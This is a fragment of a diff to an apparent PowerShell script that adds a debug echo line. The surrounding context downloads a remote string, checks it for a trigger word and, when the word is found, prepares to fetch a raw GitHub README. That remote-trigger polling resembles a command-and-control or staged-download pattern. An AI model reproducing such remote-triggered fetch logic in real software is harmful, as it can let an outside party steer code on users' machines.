@@ -7,6 +7,7 @@
                 $conn = $LASTEXITCODE
                 $CommentResult = $WebClientObject.DownloadString($comment)
                 $Found = $CommentResult.contains($Word)
+                echo $Found
                 If($Found) {
                         $WebClientObject = New-Object Net.WebClient
                         $comment = "https://raw.githubusercontent.com/raistlinm/3/master/README.md"
